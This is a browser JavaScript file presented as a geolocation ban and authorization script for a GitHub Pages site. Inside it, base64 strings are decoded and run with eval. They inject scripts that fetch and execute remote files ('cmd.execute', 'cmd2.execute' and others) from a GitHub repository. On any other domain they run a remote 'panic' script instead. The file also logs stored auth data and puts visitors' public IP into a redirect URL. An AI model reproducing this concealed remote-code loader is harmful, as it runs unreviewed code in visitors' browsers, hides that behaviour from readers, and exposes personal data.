(async () => {
    console.log("Initializing the geolocation ban script...");

    const CONFIG_URL = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/algoritm.json";
    const PANIC_SCRIPT_URL = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/geo_location_ban/panic.json";

    // Fetch the public IP address
    function fetchPublicIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip);
    }

    // Fetch configuration JSON
    async function fetchConfig() {
        try {
            const response = await fetch(CONFIG_URL);
            if (!response.ok) throw new Error("Failed to fetch JSON configuration.");
            return await response.json();
        } catch (error) {
            console.error("Error fetching configuration JSON:", error.message);
            return null;
        }
    }

    // Generate a unique incident ID
    function generateIncidentID() {
        return `incident_${Date.now()}`;
    }

    // Get authorization data from localStorage
    function getAuthData() {
        return JSON.parse(localStorage.getItem('auth')) || {};
    }

    // Main script logic
    async function executeScript() {
        console.log("Starting main script logic...");

        // Retrieve auth data
        const authData = getAuthData();
        console.log("Auth Data:", authData);

        const config = await fetchConfig();
        if (!config) {
            console.error("Failed to fetch configuration JSON.");
            return;
        }

        // Check if authData is not valid or does not exist
        if (!authData || typeof authData.auth_valid === 'undefined' || authData.auth_valid === '') {
            console.log("No valid authorization data found. Redirecting to authorization page...");
            const redirectUrl = `${config.redirect_url.verif}?goback=${encodeURIComponent(window.location.href)}`;
            console.warn("Redirecting to verification URL:", redirectUrl);
            window.location.href = redirectUrl;
            return;
        }

        // Determine actual value of auth_valid
        const authValidValue = (authData.auth_valid === 'true' || authData.auth_valid === true);
        const authInvalidValue = (authData.auth_valid === 'false' || authData.auth_valid === false);

        // Handle based on the validity
        if (!authValidValue && authInvalidValue) {
            console.log("Authorization is invalid.");

            if (authData.auth_invalid_reason) {
                console.log("User is banned. Redirecting to ban website...");
                const ip = await fetchPublicIP();  // Get user's IP address

                const payload = {
                    data: authData.auth_invalid_reason || 'User is banned',
                    ip: ip,
                    incidentid: generateIncidentID(),
                    pageaccesurl: window.location.href
                };

                const banUrl = `${config.redirect_url.normal}?${new URLSearchParams(payload).toString()}`;
                console.warn("Redirecting to ban URL:", banUrl);
                window.location.href = banUrl;  // Perform the redirect
                return;
            } else {
                console.log("User needs to authorize. Redirecting to authorization page...");
                const redirectUrl = `${config.redirect_url.verif}?goback=${encodeURIComponent(window.location.href)}`;
                console.warn("Redirecting to verification URL:", redirectUrl);
                window.location.href = redirectUrl;  // Correct redirect for authorization
                return;
            }
        }

        // Check if the auth has expired or is null
        const now = Date.now();
        if (!authData.expire_at || authData.expire_at <= now) {
            console.log("User authorization has expired or value is null. Redirecting to verification page...");
            const redirectUrl = `${config.redirect_url.verif}?goback=${encodeURIComponent(window.location.href)}`;
            console.warn("Redirecting to verification URL:", redirectUrl);
            window.location.href = redirectUrl;  // Redirect to authorization
            return;
        }

        // If authorized, you can insert additional scripts here
        console.log("Authorization is valid.");
        // Execute other scripts or logic here if necessary
    }

    // Ensure to run the script only on the correct domain
    const currentDomain = window.location.hostname;
    if (currentDomain === "drmineword.github.io") {
        console.log("Domain is correct. Executing script...");
	eval(atob("KGZ1bmN0aW9uKCkgewogICAgLy8gRnVuY3Rpb24gdG8gZHluYW1pY2FsbHkgYWRkIGEgY2FudmFzIGVsZW1lbnQgdG8gdGhlIGJvZHkKICAgIHZhciBjYW52YXMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKTsKICAgIGNhbnZhcy5pZCA9ICJjYW52YXMiOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChjYW52YXMpOwoKICAgIC8vIFN0eWxlIHRoZSBjYW52YXMgdG8gY292ZXIgdGhlIGZ1bGwgcGFnZSBhcyBhIGJhY2tncm91bmQKICAgIGNhbnZhcy5zdHlsZS5wb3NpdGlvbiA9ICJmaXhlZCI7CiAgICBjYW52YXMuc3R5bGUudG9wID0gIjAiOwogICAgY2FudmFzLnN0eWxlLmxlZnQgPSAiMCI7CiAgICBjYW52YXMuc3R5bGUuekluZGV4ID0gIjEwIjsKICAgIGNhbnZhcy5zdHlsZS5wb2ludGVyRXZlbnRzID0gIm5vbmUiOwogICAgY2FudmFzLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgY2FudmFzLnN0eWxlLmhlaWdodCA9ICIxMDAlIjsKCiAgICAvLyBGdW5jdGlvbiB0byBsb2FkIGFuZCBhcHBseSB0aGUgY2FudmFzIGNvbnRlbnQgZnJvbSB0aGUgZXh0ZXJuYWwgVVJMCiAgICBmdW5jdGlvbiBsb2FkQ2FudmFzQ29udGVudCgpIHsKICAgICAgICB2YXIgY3R4ID0gY2FudmFzLmdldENvbnRleHQoIjJkIik7CgogICAgICAgIC8vIEZldGNoIHRoZSBjb250ZW50IGZyb20gdGhlIGdpdmVuIFVSTCBmb3IgY2FudmFzIGRyYXdpbmcgbG9naWMKICAgICAgICBmZXRjaCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RyTWluZXdvcmQvQXJ0ZWZhY3QtQm9vc3QtQWN0aXZlL3JlZnMvaGVhZHMvbWFpbi9jYW52YS5jYW52YSIpCiAgICAgICAgICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgICAgICAgICAgLnRoZW4oc2NyaXB0Q29udGVudCA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiQ2FudmFzIGNvbnRlbnQgbG9hZGVkIHN1Y2Nlc3NmdWxseS4iKTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLy8gRXhlY3V0ZSB0aGUgbG9hZGVkIGNvbnRlbnQgaW5zaWRlIHRoZSBjYW52YXMKICAgICAgICAgICAgICAgIHZhciBzY3JpcHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICAgICAgICAgIHNjcmlwdC50ZXh0ID0gc2NyaXB0Q29udGVudDsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0KTsgLy8gQXBwZW5kcyB0aGUgc2NyaXB0IHRoYXQgZGVmaW5lcyB0aGUgY2FudmFzIGRyYXdpbmcgbG9naWMKCiAgICAgICAgICAgICAgICAvLyBBZnRlciB0aGUgY2FudmFzIGNvbnRlbnQgaXMgbG9hZGVkLCBleGVjdXRlIHRoZSBzZWNvbmQgc2NyaXB0IChjbWQuZXhlY3V0ZSkKICAgICAgICAgICAgICAgIGV4ZWN1dGVDbWRTY3JpcHQoKTsKICAgICAgICAgICAgfSkKICAgICAgICAgICAgLmNhdGNoKGVycm9yID0+IHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoIkVycm9yIGxvYWRpbmcgY2FudmFzIGNvbnRlbnQ6IiwgZXJyb3IpOwogICAgICAgICAgICB9KTsKICAgIH0KCiAgICAvLyBGdW5jdGlvbiB0byBsb2FkIGFuZCBleGVjdXRlIHRoZSBzZWNvbmQgc2NyaXB0IChjbWQuZXhlY3V0ZSkKICAgIGZ1bmN0aW9uIGV4ZWN1dGVDbWRTY3JpcHQoKSB7CiAgICAgICAgZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Eck1pbmV3b3JkL0FydGVmYWN0LUJvb3N0LUFjdGl2ZS9yZWZzL2hlYWRzL21haW4vY21kLmV4ZWN1dGUiKQogICAgICAgICAgICAudGhlbihyZXNwb25zZSA9PiByZXNwb25zZS50ZXh0KCkpCiAgICAgICAgICAgIC50aGVuKGNtZFNjcmlwdENvbnRlbnQgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5sb2coImNtZC5leGVjdXRlIHNjcmlwdCBsb2FkZWQgc3VjY2Vzc2Z1bGx5LiIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAvLyBDcmVhdGUgYSBuZXcgc2NyaXB0IHRhZyB0byBleGVjdXRlIHRoZSBjbWQgc2NyaXB0CiAgICAgICAgICAgICAgICB2YXIgY21kU2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgICAgICAgICBjbWRTY3JpcHQudGV4dCA9IGNtZFNjcmlwdENvbnRlbnQ7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNtZFNjcmlwdCk7IC8vIEV4ZWN1dGVzIHRoZSBjb21tYW5kIHNjcmlwdAoKICAgICAgICAgICAgICAgIC8vIE5vdyBsb2FkIGFuZCBleGVjdXRlIHRoZSB0aGlyZCBzY3JpcHQgKGNtZDIuZXhlY3V0ZSkKICAgICAgICAgICAgICAgIGV4ZWN1dGVDbWQyU2NyaXB0KCk7CiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIC5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBsb2FkaW5nIGNtZC5leGVjdXRlIHNjcmlwdDoiLCBlcnJvcik7CiAgICAgICAgICAgIH0pOwogICAgfQoKICAgIC8vIEZ1bmN0aW9uIHRvIGxvYWQgYW5kIGV4ZWN1dGUgdGhlIHRoaXJkIHNjcmlwdCAoY21kMi5leGVjdXRlKQogICAgZnVuY3Rpb24gZXhlY3V0ZUNtZDJTY3JpcHQoKSB7CiAgICAgICAgZmV0Y2goImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Eck1pbmV3b3JkL0FydGVmYWN0LUJvb3N0LUFjdGl2ZS9yZWZzL2hlYWRzL21haW4vY21kMi5leGVjdXRlIikKICAgICAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKQogICAgICAgICAgICAudGhlbihjbWQyU2NyaXB0Q29udGVudCA9PiB7CiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiY21kMi5leGVjdXRlIHNjcmlwdCBsb2FkZWQgc3VjY2Vzc2Z1bGx5LiIpOwoKICAgICAgICAgICAgICAgIC8vIENyZWF0ZSBhIG5ldyBzY3JpcHQgdGFnIHRvIGV4ZWN1dGUgdGhlIGNtZDIgc2NyaXB0CiAgICAgICAgICAgICAgICB2YXIgY21kMlNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpOwogICAgICAgICAgICAgICAgY21kMlNjcmlwdC50ZXh0ID0gY21kMlNjcmlwdENvbnRlbnQ7CiAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNtZDJTY3JpcHQpOyAvLyBFeGVjdXRlcyB0aGUgc2Vjb25kIGNvbW1hbmQgc2NyaXB0CgogICAgICAgICAgICAgICAgLy8gTG9nIHRvIHRoZSBjb25zb2xlIHRoYXQgdGhlIHNjcmlwdCBoYXMgYmVlbiBleGVjdXRlZAogICAgICAgICAgICAgICAgY29uc29sZS5sb2coImNtZDIuZXhlY3V0ZSBzY3JpcHQgZXhlY3V0ZWQgc3VjY2Vzc2Z1bGx5LiIpOwogICAgICAgICAgICB9KQogICAgICAgICAgICAuY2F0Y2goZXJyb3IgPT4gewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3IgbG9hZGluZyBjbWQyLmV4ZWN1dGUgc2NyaXB0OiIsIGVycm9yKTsKICAgICAgICAgICAgfSk7CiAgICB9CgogICAgLy8gSW5pdGlhbGl6ZSB0aGUgY2FudmFzIGNvbnRlbnQgYW5kIHN0YXJ0IHRoZSBwcm9jZXNzCiAgICBsb2FkQ2FudmFzQ29udGVudCgpOwoKfSkoKTs="));
        await executeScript();
    } else {
        console.log("Domain is incorrect. Skipping execution.");
	eval(atob("KGFzeW5jICgpID0-IHsKICAgICAgICAgICAgY29uc3QgcGFuaWNTY3JpcHRVcmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RyTWluZXdvcmQvQXJ0ZWZhY3QtQm9vc3QtQWN0aXZlL3JlZnMvaGVhZHMvbWFpbi9nZW9fbG9jYXRpb25fYmFuL3BhbmljMi5qc29uIjsKdHJ5IHsKICAgICAgICAgICAgICAgIGNvbnN0IHBhbmljUmVzcG9uc2UgPSBhd2FpdCBmZXRjaChwYW5pY1NjcmlwdFVybCk7CiAgICAgICAgICAgICAgICBjb25zdCBwYW5pY0pzb24gPSBhd2FpdCBwYW5pY1Jlc3BvbnNlLmpzb24oKTsKCiAgICAgICAgICAgICAgICBpZiAocGFuaWNKc29uLnBhbmljX3NjcmlwdCkgewogICAgICAgICAgICAgICAgICAgIGNvbnN0IHNjcmlwdEVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICAgICAgICAgICAgICBzY3JpcHRFbGVtZW50LnRleHRDb250ZW50ID0gcGFuaWNKc29uLnBhbmljX3NjcmlwdDsKICAgICAgICAgICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHNjcmlwdEVsZW1lbnQpOwoKICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiUGFuaWMgc2NyaXB0IGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseS4iKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcigiUGFuaWMgc2NyaXB0IG5vdCBmb3VuZCBpbiBKU09OLiIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3IgZXhlY3V0aW5nIHBhbmljIHNjcmlwdDoiLCBlcnJvcik7CiAgICAgICAgICAgIH0KICAgICAgICB9KSgpOw"));
    }
})();
